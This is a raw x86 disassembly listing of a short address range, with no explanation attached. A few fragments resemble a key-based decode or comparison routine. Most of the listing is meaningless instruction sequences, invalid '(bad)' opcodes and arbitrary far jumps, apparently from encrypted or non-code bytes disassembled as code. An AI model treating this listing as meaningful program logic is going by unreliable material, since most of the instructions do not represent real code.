  4039e1:	push   ds
  4039e2:	call   0x8c89b613
  4039e7:	test   eax,0xe8614a74
  4039ec:	mov    WORD PTR [esi-0x56],?
  4039ef:	sub    ah,BYTE PTR [eax-0x64]
  4039f2:	test   eax,0xd8be9608
  4039f7:	mov    esi,0xfa1f04cb
  4039fc:	cli    
  4039fd:	mov    ebx,0x458b0289
  403a02:	clc    
  403a03:	xor    eax,ecx
  403a05:	add    eax,esi
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
  403a31:	mov    edx,DWORD PTR [ebp+0xc]
  403a34:	movsx  edx,BYTE PTR [edx]
  403a37:	xor    eax,ecx
  403a39:	add    eax,esi
  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0x23cc5c12
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403a51
  403a5b:	daa    
  403a5c:	fld    st(4)
  403a5e:	mov    ebp,0x38204d93
  403a63:	mov    ss,eax
  403a65:	pop    edx
  403a66:	and    eax,ebx
  403a68:	loopne 0x403a07
  403a6a:	xlat   BYTE PTR ds:[ebx]
  403a6b:	jg     0x8f27348b
  403a71:	scas   al,BYTE PTR es:[edi]
  403a72:	rcl    BYTE PTR [eax],1
  403a74:	cs jns 0x403ab6
  403a77:	pop    es
  403a78:	cmc    
  403a79:	icebp  
  403a7a:	push   es
  403a7b:	mov    al,0xa5
  403a7d:	push   eax
  403a7e:	mov    edi,0x8b7e3b7c
  403a83:	mov    ecx,0x21a7ee24
  403a88:	leave  
  403a89:	add    DWORD PTR [edi+0x2a9806c5],ebp
  403a8f:	stc    
  403a90:	jmp    0xd460:0xe7095fd0
  403a97:	aas    
  403a98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a99:	inc    ecx
  403a9a:	mov    ecx,0x51c15d5e
  403a9f:	mov    dl,0x79
  403aa1:	sar    DWORD PTR [ebx+0x409973cb],cl
  403aa7:	and    BYTE PTR [ecx+ebp*8-0x75],cl
  403aab:	jne    0x403acf
  403aad:	test   eax,0x6297a721
  403ab2:	pop    edi
  403ab3:	jmp    0x403ae2
  403ab5:	mov    cl,0x98
  403ab7:	xor    edx,DWORD PTR [ebx]
  403ab9:	jmp    0x403a89
  403abb:	lods   eax,DWORD PTR ds:[esi]
  403abc:	push   ecx
  403abd:	jmp    0x12d4:0xb3d6bf23
  403ac4:	mov    dl,0x3c
  403ac6:	cmp    DWORD PTR [edi-0x3fa00fc9],ebp
  403acc:	rcr    ebp,1
  403ace:	mov    esi,0x372d437d
  403ad3:	inc    esi
  403ad4:	push   edx
  403ad5:	sbb    dl,ah
  403ad7:	test   al,0xbe
  403ad9:	call   DWORD PTR [edx+ebx*8-0x55]
  403add:	pop    esp
  403ade:	mov    ecx,0x46dee18
  403ae3:	aas    
  403ae4:	cmc    
  403ae5:	sub    BYTE PTR [ecx+0x6ab3330b],cl
  403aeb:	push   esi
  403aec:	xchg   edi,eax
  403aed:	xchg   edi,eax
  403aee:	xor    DWORD PTR [esp+edi*8-0x44ba637b],0x2d
  403af6:	arpl   WORD PTR [eax+0x38406f54],bp
  403afc:	add    dh,BYTE PTR [ecx+0x383f60c6]
  403b02:	inc    eax
  403b03:	out    dx,al
  403b04:	pop    ss
  403b05:	sub    al,0xea
  403b07:	bswap  eax
  403b09:	mov    eax,ds:0xfaf2edd9
  403b0e:	adc    esi,DWORD PTR ds:0x82d74f9c
  403b14:	in     eax,dx
  403b15:	or     al,0x42
  403b17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b18:	out    dx,al
  403b19:	fs pop ebx
  403b1b:	sub    eax,0xdc1a2c2a
  403b20:	imul   esp,DWORD PTR [ecx+0x3c1e7dfa],0x29
  403b27:	sub    edx,DWORD PTR [eax-0x1ff7c0c]
  403b2d:	mov    esi,0x613d3acb
  403b32:	sub    ebp,edx
  403b34:	stos   BYTE PTR es:[edi],al
  403b35:	push   esp
  403b36:	imul   ecx,DWORD PTR [ebp-0x71840b60],0x5c357957
  403b40:	jl     0x403b98
  403b42:	push   0x7d
  403b44:	cmp    ebx,esi
  403b46:	xchg   BYTE PTR [esi],al
  403b48:	push   0x7d25b5dd
  403b4d:	jne    0x403b5e
  403b4f:	cmp    DWORD PTR [ebx+0x77],0xf82c5eff
  403b56:	cmp    BYTE PTR [edx-0x779b3f7d],ah
  403b5c:	dec    ecx
  403b5d:	cwde   
  403b5e:	(bad)  
  403b5f:	scas   al,BYTE PTR es:[edi]
  403b60:	pop    eax
  403b61:	pop    ebx
  403b62:	cmp    BYTE PTR [edi+0x2],dh
  403b65:	xor    ebx,edi
  403b67:	scas   al,BYTE PTR es:[edi]
  403b68:	popa   
  403b69:	or     bl,BYTE PTR [ebp+0x28034895]
  403b6f:	hlt    
  403b70:	aas    
  403b71:	je     0x403afa
  403b73:	xlat   BYTE PTR ds:[ebx]
  403b74:	push   ds
  403b75:	pusha  
  403b76:	mov    ch,0xd0
  403b78:	lahf   
  403b79:	dec    ebx
  403b7a:	dec    esi
  403b7b:	test   eax,0x773c7b4c
  403b80:	imul   esi,DWORD PTR [esi-0x407e8984],0x15
  403b87:	das    
  403b88:	mov    ecx,0x1f90d7da
  403b8d:	imul   ebx,ebp,0xc5d654ed
  403b93:	scas   eax,DWORD PTR es:[edi]
  403b94:	inc    ebx
  403b95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b96:	jne    0x403bde
  403b98:	nop
  403b99:	cmp    BYTE PTR [ebx+0x782f30b],dh
  403b9f:	inc    ebp
  403ba0:	push   cs
  403ba1:	sbb    ebp,DWORD PTR [edi+0x196726e7]
  403ba7:	push   ecx
  403ba8:	sbb    al,0xd2
  403baa:	out    dx,eax
  403bab:	test   BYTE PTR [esi+0x55de34e2],bh
  403bb1:	sbb    ah,bh
  403bb3:	jmp    0x403be9
  403bb5:	or     bh,BYTE PTR [edi]
  403bb7:	jg     0x403bc7
  403bb9:	sbb    al,0xd5
  403bbb:	sub    cl,BYTE PTR [edi+0x3e9b9696]
  403bc1:	push   ss
  403bc2:	sub    BYTE PTR [esi+0x63],ah
  403bc5:	ins    DWORD PTR es:[edi],dx
  403bc6:	stos   BYTE PTR es:[edi],al
  403bc7:	lods   al,BYTE PTR ds:[esi]
  403bc8:	fcmovbe st,st(3)
  403bca:	es mov ch,0x99
  403bcd:	adc    BYTE PTR [ecx+0x34d0fa73],bh
  403bd3:	arpl   WORD PTR [ebx],di
  403bd5:	mov    al,0x2e
  403bd7:	inc    ebx
  403bd8:	(bad)  
  403bd9:	loope  0x403c4f
  403bdb:	adc    al,0x5f
  403bdd:	jb     0x403bfe
  403bdf:	xchg   dh,ch
  403be1:	out    0xed,al
  403be3:	in     al,0xcf
  403be5:	bound  ecx,QWORD PTR [ebp-0x51]
  403be8:	inc    esp
  403be9:	push   0x1e
  403beb:	adc    eax,0x6066f095
  403bf0:	cmp    eax,0xfb7d5ad9
  403bf5:	stos   BYTE PTR es:[edi],al
  403bf6:	mov    eax,ds:0x5a6dad4d
  403bfb:	dec    ebp
  403bfc:	fild   QWORD PTR [eax]
  403bfe:	sbb    BYTE PTR [ebp-0x12],bh
  403c01:	pop    ecx
  403c02:	lahf   
  403c03:	leave  
  403c04:	int    0xb2
  403c06:	addr16 jp 0x403bf2
  403c09:	fimul  DWORD PTR [edi]
  403c0b:	test   BYTE PTR [edi-0x38fffffb],dl
  403c11:	inc    ebp
  403c12:	call   0x74639a6
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0x86dcf48b
  403c29:	dec    esi
  403c2a:	pusha  
  403c2b:	ret    0x1e42
  403c2e:	jle    0x403cae
  403c30:	scas   al,BYTE PTR es:[edi]
  403c31:	jg     0x403cb1
  403c33:	jle    0x403c94
  403c35:	or     BYTE PTR [edi+0x51],0xf5
  403c39:	fwait
  403c3a:	cmp    al,BYTE PTR [ebx-0x7]
  403c3d:	mov    bh,0x17
  403c3f:	jno    0x403c8d
  403c41:	jns    0x403c1c
  403c43:	jl     0x403c66
  403c45:	ds mov esi,0x1ec2c0f0
  403c4b:	xor    bh,ch
  403c4d:	outs   dx,BYTE PTR ds:[esi]
  403c4e:	rcl    BYTE PTR [edx+0x3edec0a7],1
  403c54:	mov    dh,0xa
  403c56:	xor    al,BYTE PTR [ebp+0x46618d00]
  403c5c:	hlt    
  403c5d:	mov    ebx,0xee0fcdf
  403c62:	xchg   ebp,eax
  403c63:	and    ebp,DWORD PTR [esi+0x59b81de9]
  403c69:	lds    ecx,FWORD PTR [ebp+0x7a]
  403c6c:	daa    
  403c6d:	and    esp,0xdf0071c0
  403c73:	aad    0xfc
  403c75:	add    al,BYTE PTR [edx-0x474ae53d]
  403c7b:	xchg   BYTE PTR [ebp-0x5],ah
  403c7e:	ficomp DWORD PTR fs:[eax+0x3e]
  403c82:	lock add esp,DWORD PTR [ecx+0x1238975d]
  403c89:	into   
  403c8a:	mov    ecx,0xa135f61
  403c8f:	add    bh,BYTE PTR [edi+0xb]
  403c92:	inc    edi
  403c93:	clc    
  403c94:	mov    esp,0xa68ea67a
  403c99:	mov    ebp,0x6f094624
  403c9e:	scas   al,BYTE PTR es:[edi]
  403c9f:	(bad)  
  403ca0:	addr16 inc ebp
  403ca2:	and    ch,0x19
  403ca5:	lea    ebx,[esi-0x75]
  403ca8:	dec    edx
  403ca9:	(bad)  
  403caa:	mov    cl,0x28
  403cac:	xor    ah,BYTE PTR [ecx]
  403cae:	pop    ss
  403caf:	(bad)  
  403cb0:	adc    BYTE PTR [ebp+0x6374231d],ch
  403cb6:	jle    0x403d2a
  403cb8:	ret    
  403cb9:	test   al,0x4
  403cbb:	outs   dx,BYTE PTR ds:[esi]
  403cbc:	mov    edi,0x689e99ad
  403cc1:	jmp    0x40e4:0x74974b6b
  403cc8:	test   BYTE PTR [edi+0x42],0x6
  403ccc:	sub    ebp,DWORD PTR [ebp-0x4b]
  403ccf:	ret    
  403cd0:	dec    ecx
  403cd1:	int3   
  403cd2:	inc    ecx
  403cd3:	outs   dx,DWORD PTR ds:[esi]
  403cd4:	jmp    0x4e3:0x7a92
  403cda:	adc    al,0x25
  403cdc:	nop
  403cdd:	mov    edx,0x89bd7a01
  403ce2:	pop    ecx
  403ce3:	ret    
  403ce4:	adc    DWORD PTR [edi+ebp*8],0x81e95389
  403ceb:	push   eax
  403cec:	pop    edi
  403ced:	or     BYTE PTR [ecx+0x6691c00a],al
  403cf3:	jmp    0x2b0c:0x72253cbd
  403cfa:	loop   0x403cb3
  403cfc:	fsub   DWORD PTR [eax]
  403cfe:	mov    ecx,0x27f66dcc
  403d03:	mov    ds,WORD PTR [ebp+0xff5e13c]
  403d09:	pop    ss
  403d0a:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d0c:	inc    ebx
  403d0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d0e:	(bad)  
  403d10:	or     BYTE PTR [edi-0x28],0x40
  403d14:	ss inc edi
  403d16:	or     eax,0xbcd748c9
  403d1b:	in     al,0x94
  403d1d:	xor    DWORD PTR [edi+0x1b],ecx
  403d20:	test   al,0x5f
  403d22:	cdq    
  403d23:	fnstsw WORD PTR [eax+0x78119c13]
  403d29:	xor    eax,0x731a3d9d
  403d2e:	sti    
  403d2f:	out    0x36,eax
  403d31:	jae    0x403d20
  403d33:	push   ecx
  403d34:	and    ecx,edx
  403d36:	cmp    al,0x5a
  403d38:	leave  
  403d39:	mov    edx,0x33310b71
  403d3e:	cs xchg ebx,eax
  403d40:	xlat   BYTE PTR ds:[ebx]
  403d41:	lods   al,BYTE PTR ds:[esi]
  403d42:	ret    
  403d43:	enter  0x3e61,0x7f
  403d47:	loopne 0x403d39
  403d49:	fld    QWORD PTR [ebx-0x48]
  403d4c:	xchg   ebx,eax
  403d4d:	addr16 xchg si,ax
  403d50:	cs fs aas 
  403d53:	add    DWORD PTR [edx+0x6f],ebx
  403d56:	test   eax,0xa1ec5e46
  403d5b:	inc    ebp
  403d5c:	cmp    bl,cl
  403d5e:	add    eax,DWORD PTR [edi+0x42]
  403d61:	jns    0x403d1c
  403d63:	shr    BYTE PTR [edx+0x0],cl
  403d66:	xchg   esi,eax
  403d67:	outs   dx,BYTE PTR ds:[esi]
  403d68:	dec    edi
  403d69:	add    DWORD PTR [esi-0x282c6215],esp
  403d6f:	addr16 mov ch,0x55
  403d72:	jle    0x403d39
  403d74:	sti    
  403d75:	repz inc edx
  403d77:	jmp    0x403d80
  403d79:	aad    0x77
  403d7b:	adc    cl,BYTE PTR [ebx+edi*4-0x65]
  403d7f:	ins    DWORD PTR es:[edi],dx
  403d80:	jge    0x403d33
  403d82:	dec    bh
  403d84:	addr16 jp 0x403d78
  403d87:	jb     0x403d38
  403d89:	adc    bh,BYTE PTR [ebp-0x35ca4bd4]
  403d8f:	jl     0x403dc5
  403d91:	ret    0xcca1
  403d94:	jae    0x403e0f
  403d96:	mov    edx,0x47e141b
  403d9b:	ins    BYTE PTR es:[edi],dx
  403d9c:	adc    dh,BYTE PTR [eax-0x5]
  403d9f:	icebp  
  403da0:	add    eax,0xae5c8c47
  403da5:	inc    ecx
  403da6:	outs   dx,DWORD PTR ds:[esi]
  403da7:	cmp    ecx,DWORD PTR [ecx-0x23]
  403daa:	xor    BYTE PTR [ecx-0x8474c09],0x14
  403db1:	sbb    al,0xa3
  403db3:	jmp    0x403e10
  403db5:	ror    DWORD PTR [esp+edx*4+0xc1a2186],cl
  403dbc:	dec    ebp
  403dbd:	xor    edx,esi
  403dbf:	xor    BYTE PTR [ebp+0x53],dl
  403dc2:	call   0xf2be:0xc40ed0ad
  403dc9:	(bad)  
  403dca:	je     0x403dc5
  403dcc:	dec    ebp
  403dcd:	or     edx,DWORD PTR [edi-0x304d7cff]
  403dd3:	inc    ecx
  403dd4:	mov    DWORD PTR [ecx*1+0x64825d31],eax
  403ddb:	push   ds
  403ddc:	es (bad) 
  403dde:	aas    
  403ddf:	popf   
  403de0:	or     eax,0x8de77410
  403de5:	inc    ebp
  403de6:	call   0x8c2c8374
  403deb:	inc    ebp
  403dec:	in     al,dx
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi-0x73ed8d4c],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403e7b
  403e11:	nop
  403e12:	mov    ds:0x56dcc32,al
  403e17:	mov    BYTE PTR [esi+0x3d],bh
  403e1a:	test   eax,0xad06e53c
  403e1f:	mov    dl,0x7a
  403e21:	push   edx
  403e22:	(bad)  
  403e23:	cld    
  403e24:	push   ds
  403e25:	retf   
  403e26:	xchg   ebx,eax
  403e27:	sub    BYTE PTR [esi+eax*1-0x5dd9bd29],0x19
  403e2f:	imul   ebp,DWORD PTR [eax-0x3b],0xb9c11b22
  403e36:	popa   
  403e37:	out    0xb1,al
  403e39:	lock mov edx,0x6ab815aa
  403e3f:	xchg   esi,eax
  403e40:	mov    bh,ah
  403e42:	pop    ds
  403e43:	mov    ebp,DWORD PTR [ecx]
  403e45:	inc    eax
  403e46:	mov    esp,DWORD PTR [edi]
  403e48:	in     al,0x24
  403e4a:	lock and dl,dl
  403e4d:	aaa    
  403e4e:	clc    
  403e4f:	int3   
  403e50:	mov    ecx,fs
  403e52:	push   esi
  403e53:	popf   
  403e54:	fcmovnbe st,st(7)
  403e56:	sbb    DWORD PTR [edx+ebp*8],ebx
  403e59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e5a:	popf   
  403e5b:	push   0xeb287220
  403e60:	sti    
  403e61:	xchg   ebp,eax
  403e62:	aad    0xf7
  403e64:	jecxz  0x403e3c
  403e66:	mov    ecx,0xec9d409c
  403e6b:	xor    bh,BYTE PTR [eax]
  403e6d:	xor    bl,0x94
  403e70:	scas   al,BYTE PTR es:[edi]
  403e71:	sub    edx,ebp
  403e73:	lahf   
  403e74:	clc    
  403e75:	or     al,0xa6
  403e77:	je     0x403e72
  403e79:	icebp  
  403e7a:	loop   0x403e0d
  403e7c:	jl     0x403e1c
  403e7e:	or     al,0x50
  403e80:	inc    ebp
  403e81:	test   eax,0x8ae401b3
  403e86:	lock adc BYTE PTR [ebp+0x56f5075c],ah
  403e8d:	loopne 0x403ed7
  403e8f:	(bad)  
  403e90:	sub    DWORD PTR [ebx],ebx
  403e92:	pushf  
  403e93:	(bad)  
  403e94:	enter  0x9fe8,0xf6
  403e98:	gs sahf 
  403e9a:	enter  0xff2c,0x84
  403e9e:	fdiv   QWORD PTR [ebp-0xc]
  403ea1:	add    DWORD PTR [ebp+0x52],ecx
  403ea4:	(bad)  
  403ea5:	jmp    0x403ed0
  403ea7:	(bad)  
  403ea8:	cmp    BYTE PTR [eax-0x154ca300],ch
  403eae:	pushf  
  403eaf:	fst    DWORD PTR [edi]
  403eb1:	jae    0x403ea2
  403eb3:	xor    ebx,edx
  403eb5:	out    dx,eax
  403eb6:	into   
  403eb7:	and    al,0x26
  403eb9:	jno    0x403e5a
  403ebb:	outs   dx,DWORD PTR ds:[esi]
  403ebc:	push   ds
  403ebd:	fsubr  QWORD PTR [edx-0x28c6ffec]
  403ec3:	(bad)  
  403ec4:	dec    ebp
  403ec5:	popa   
  403ec6:	(bad)  
  403ec8:	shl    DWORD PTR [esi+esi*8],0x21
  403ecc:	jecxz  0x403f45
  403ece:	cmp    ch,cl
  403ed0:	mov    dh,0x7c
  403ed2:	jns    0x403efc
  403ed4:	out    dx,eax
  403ed5:	jo     0x403eb8
  403ed7:	fidivr WORD PTR [edi+0x5dbc6163]
  403edd:	addr16 add eax,0x981c7606
  403ee3:	xor    DWORD PTR [ebp+0x33],esi
  403ee6:	stc    
  403ee7:	test   eax,0xc4d04093
  403eec:	inc    ebp
  403eed:	sbb    edi,DWORD PTR [ebx+0x64ebc59f]
  403ef3:	fist   DWORD PTR [esi+ecx*8-0x32]
  403ef7:	add    DWORD PTR cs:[edx+0x2b],0xcbbec5a2
  403eff:	sar    ebx,0x7b
  403f02:	sub    DWORD PTR [ebp-0x5e],ebx
  403f05:	add    BYTE PTR [ecx],0x98
  403f08:	aaa    
  403f09:	lds    esp,FWORD PTR [ebx-0x35ff13cb]
  403f0f:	dec    esi
  403f10:	fbstp  TBYTE PTR [ecx]
  403f12:	imul   ebp,DWORD PTR [edx-0x10],0xf77ef7e8
  403f19:	(bad)  
  403f1a:	cmp    esp,DWORD PTR [edi+ebx*2+0x55]
  403f1e:	outs   dx,BYTE PTR ds:[esi]
  403f1f:	sbb    sp,WORD PTR [ecx+eiz*2]
  403f23:	mul    BYTE PTR [edx]
  403f25:	mov    dh,0x7e
  403f27:	cld    
  403f28:	xchg   esp,eax
  403f29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f2a:	sub    DWORD PTR [edx],edi
  403f2c:	dec    DWORD PTR [eax]
  403f2e:	mov    esp,0x3cfb5c60
  403f33:	cdq    
  403f34:	addr16 mov ebp,0xe690682b
  403f3a:	xchg   DWORD PTR [ecx-0x218f6b98],ecx
  403f40:	jl     0x403eee
  403f42:	sar    ecx,1
  403f44:	iret   
  403f45:	test   BYTE PTR [ebx-0x43ef9e4f],bh
  403f4b:	xor    eax,0x72039aee
  403f50:	sbb    BYTE PTR [esi+0x72],0x64
  403f54:	rol    eax,1
  403f56:	jl     0x403f48
  403f58:	cmp    dl,BYTE PTR ds:0xb6d6b8b0
  403f5e:	xor    BYTE PTR [ecx+0x73],ch
  403f61:	push   esi
  403f62:	cdq    
  403f63:	in     eax,0x69
  403f65:	(bad)  
  403f66:	lods   al,BYTE PTR ds:[esi]
  403f67:	daa    
  403f68:	mov    ah,0xb3
  403f6a:	push   edx
  403f6b:	xchg   ecx,eax
  403f6c:	lock xchg BYTE PTR [ebp-0x44],al
  403f70:	xor    eax,0xe4d819c6
  403f75:	dec    edx
  403f76:	adc    BYTE PTR [ecx],al
  403f78:	cdq    
  403f79:	in     al,dx
  403f7a:	int    0xf0
  403f7c:	aam    0xc4
  403f7e:	aaa    
  403f7f:	pop    ds
  403f80:	push   esi
  403f81:	push   esp
  403f82:	inc    esi
  403f83:	add    dh,BYTE PTR [edi-0x3a]
  403f86:	lahf   
  403f87:	dec    edx
  403f88:	aam    0xd1
  403f8a:	mov    ds:0xaff6fd03,al
  403f8f:	mov    ds:0xb995b9c,eax
  403f94:	leave  
  403f95:	retf   0xcab3
  403f98:	push   eax
  403f99:	adc    DWORD PTR [edx+0x740d9385],0x2e22a34d
  403fa3:	int3   
  403fa4:	clc    
  403fa5:	nop
  403fa6:	mov    edx,DWORD PTR ds:0x5bd13cda
  403fac:	add    ebp,ecx
  403fae:	mov    cl,0xc7
  403fb0:	cmp    bl,bl
  403fb2:	call   0x81fc:0xd723cc0f
  403fb9:	mov    edi,0xe8c8f66a
  403fbe:	iret   
  403fbf:	mov    bl,0x8b
  403fc1:	inc    ebp
  403fc2:	lock mov edx,DWORD PTR [ebp+0x8]
  403fc6:	xor    eax,ecx
  403fc8:	jmp    0x404195
  403fcd:	pop    edi
  403fce:	sub    al,0x9f
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	inc    edi
  403fda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fdb:	lods   eax,DWORD PTR ds:[esi]
  403fdc:	mov    BYTE PTR [edx],ah
  403fde:	sbb    bh,BYTE PTR [esi+0x7e]
  403fe1:	scas   al,BYTE PTR es:[edi]
  403fe2:	jg     0x404062
  403fe4:	jle    0x403fa0
  403fe6:	aam    0xbd
  403fe8:	nop
  403fe9:	std    
  403fea:	enter  0xda4f,0x4
  403fee:	sub    eax,0x7921c4e
  403ff3:	shr    BYTE PTR [edx],1
  403ff5:	stos   DWORD PTR es:[edi],eax
  403ff6:	repnz inc esp
  403ff8:	test   BYTE PTR [edi],ah
  403ffa:	call   0xd368:0x6c5f0fe1
  404001:	mov    esi,0xeecce45b
  404006:	gs xchg esi,eax
  404008:	xchg   esp,eax
  404009:	imul   ebp,esp,0xe8281a54
  40400f:	repz xchg ebp,eax
  404011:	and    al,0x64
  404013:	outs   dx,BYTE PTR ds:[esi]
  404014:	fadd   QWORD PTR [esi+0x49]
  404017:	cli    
  404018:	arpl   WORD PTR [ebx-0x73],bx
  40401b:	loop   0x40409c
  40401d:	xor    dh,BYTE PTR [ebx]
  40401f:	(bad)  
  404020:	call   0x842da209
  404025:	xor    dh,BYTE PTR [esi+0xe2d75b3]
  40402b:	adc    al,0xaa
  40402d:	(bad)  
  40402e:	mov    dh,0xa1
  404030:	cli    
  404031:	fiadd  DWORD PTR [eax-0x53]
  404034:	or     ch,BYTE PTR [edx+0x16]
  404037:	jmp    0x4040a3
  404039:	inc    edx
  40403a:	mov    DWORD PTR fs:[eax+0x2009f105],ebx
  404041:	xchg   edi,eax
  404042:	in     eax,0x84
  404044:	mov    bh,0x53
  404046:	xchg   ebp,eax
  404047:	sub    dh,BYTE PTR [ecx+0x4d]
  40404a:	pop    esp
  40404b:	jge    0x403ffc
  40404d:	adc    al,0x61
  40404f:	jo     0x404044
  404051:	mov    cl,0xc
  404053:	push   ebx
  404054:	js     0x403ffb
  404056:	pusha  
  404057:	lods   al,BYTE PTR ds:[esi]
  404058:	dec    eax
  404059:	retf   
  40405a:	inc    eax
  40405b:	daa    
  40405c:	dec    edx
  40405d:	test   BYTE PTR [edi],al
  40405f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404060:	imul   esp,esi,0xffffffd7
  404063:	adc    BYTE PTR [ecx-0x4692a798],0xd3
  40406a:	ret    
  40406b:	addr16 out dx,eax
  40406d:	out    dx,al
  40406e:	or     ch,BYTE PTR [esi+edi*1-0x2bb915e8]
  404075:	data16 xlat BYTE PTR ds:[ebx]
  404077:	bound  ecx,QWORD PTR [esi+eiz*8]
  40407a:	(bad)  
  40407b:	data16 clc 
  40407d:	xor    dl,BYTE PTR [edi+0x55]
  404080:	(bad)  
  404082:	test   esi,ebx
  404084:	fisttp QWORD PTR [ebx]
  404086:	dec    ebp
  404087:	adc    DWORD PTR [edi+eiz*4+0x679b8d97],esi
  40408e:	pushf  
  40408f:	mov    ch,0x36
  404091:	inc    edx
  404092:	outs   dx,DWORD PTR ds:[esi]
  404093:	jmp    0x1c49d17b
  404098:	mov    WORD PTR [ebx-0x46],cs
  40409b:	aam    0x6
  40409d:	scas   al,BYTE PTR es:[edi]
  40409e:	jp     0x404104
  4040a0:	pop    esi
  4040a1:	mov    DWORD PTR [edx-0x74],edi
  4040a4:	add    eax,0xb0e98412
  4040a9:	xchg   ebp,eax
  4040aa:	repz test DWORD PTR [ebp-0x5f9c36c2],esp
  4040b1:	xor    al,bh
  4040b3:	(bad)  
  4040b4:	hlt    
  4040b5:	push   esi
  4040b6:	pop    ebx
  4040b7:	push   0x5a
  4040b9:	push   esi
  4040ba:	loope  0x4040f2
  4040bc:	adc    ah,bh
  4040be:	push   esi
  4040bf:	js     0x404080
  4040c1:	mov    ebx,DWORD PTR [eax+0x592c28c]
  4040c7:	jo     0x4040cc
  4040c9:	pusha  
  4040ca:	sbb    DWORD PTR [edx-0x6b],esi
  4040cd:	push   ebx
  4040ce:	and    al,0xbb
  4040d0:	xchg   esi,eax
  4040d1:	pop    ebx
  4040d2:	imul   ecx,DWORD PTR [eax],0x88959b39
  4040d8:	stos   DWORD PTR es:[edi],eax
  4040d9:	cmp    ch,bh
  4040db:	xchg   ebx,eax
  4040dc:	push   DWORD PTR [edi+0x56]
  4040df:	adc    DWORD PTR [edi+0x79],ebx
  4040e2:	and    dh,BYTE PTR fs:[eax-0x4f]
  4040e6:	dec    ebx
  4040e7:	cmp    ebx,DWORD PTR [edi]
  4040e9:	out    0x29,al
  4040eb:	inc    ebx
  4040ec:	imul   ecx,DWORD PTR [esi],0x2382e13c
  4040f2:	mov    bh,0x8a
  4040f4:	add    cl,BYTE PTR ds:0x29ef43c4
  4040fa:	sub    DWORD PTR [edx-0x16],esi
  4040fd:	pop    esp
  4040fe:	jno    0x40415d
  404100:	in     eax,dx
  404101:	aad    0xc4
  404103:	shl    ecx,1
  404105:	xchg   edi,eax
  404106:	sbb    dl,BYTE PTR [ebx-0x39]
  404109:	push   0x16
  40410b:	push   ds
  40410c:	repz mov ecx,0x506f6b53
  404112:	add    al,BYTE PTR [esi]
  404114:	or     BYTE PTR [edx-0x301c73b8],0xe2
  40411b:	pop    eax
  40411c:	iret   
  40411d:	inc    edx
  40411e:	dec    edx
  40411f:	push   esi
  404120:	mov    edi,0xa30143c0
  404125:	test   DWORD PTR [edi-0x5f],ebx
  404128:	pushf  
  404129:	repnz leave 
  40412b:	lods   eax,DWORD PTR ds:[esi]
  40412c:	and    dh,BYTE PTR [edx]
  40412e:	in     al,dx
  40412f:	enter  0xce16,0xac
  404133:	mov    ds,esp
  404135:	ret    0x17c1
  404138:	push   ss
  404139:	pushf  
  40413a:	lods   eax,DWORD PTR ds:[esi]
  40413b:	(bad)  
  40413c:	std    
  40413d:	push   es
  40413e:	fsub   DWORD PTR [ebx+0x53c73788]
  404144:	in     eax,0xb2
  404146:	mov    edx,ecx
  404148:	fisubr DWORD PTR [ebx-0x24]
  40414b:	and    al,0x3a
  40414d:	sbb    eax,0x99abe69a
  404152:	adc    edx,DWORD PTR [eax+0x32]
  404155:	push   edi
  404156:	add    al,0x60
  404158:	mov    ah,0x1c
  40415a:	and    al,0xe1
  40415c:	(bad)  
  40415d:	mov    ss,WORD PTR [ecx-0x61]
  404160:	pop    ss
  404161:	jnp    0x404156
  404163:	mov    esp,0x458850a8
  404168:	adc    dh,bl
  40416a:	jo     0x4041b9
  40416c:	cmp    DWORD PTR [ecx],eax
  40416e:	sub    eax,0x374037c5
  404173:	lods   eax,DWORD PTR ds:[esi]
  404174:	inc    esi
  404175:	mov    dh,0x78
  404177:	xchg   ebx,eax
  404178:	retf   0xec61
  40417b:	mov    ebp,0xcc47ff7f
  404180:	or     BYTE PTR [edi-0x5d],cl
  404183:	sbb    al,0x76
  404185:	push   edx
  404186:	mov    bl,0xc7
  404188:	ficomp WORD PTR [eax+0x3100cf52]
  40418e:	inc    ebx
  40418f:	jnp    0x4041fe
  404191:	add    DWORD PTR [eax],esi
  404193:	xor    ecx,DWORD PTR [ecx*4+0x729b1084]
  40419a:	xor    al,BYTE PTR [eax]
  40419c:	mov    DWORD PTR [ebp+0x8],eax
  40419f:	inc    DWORD PTR [ebp+0xc]
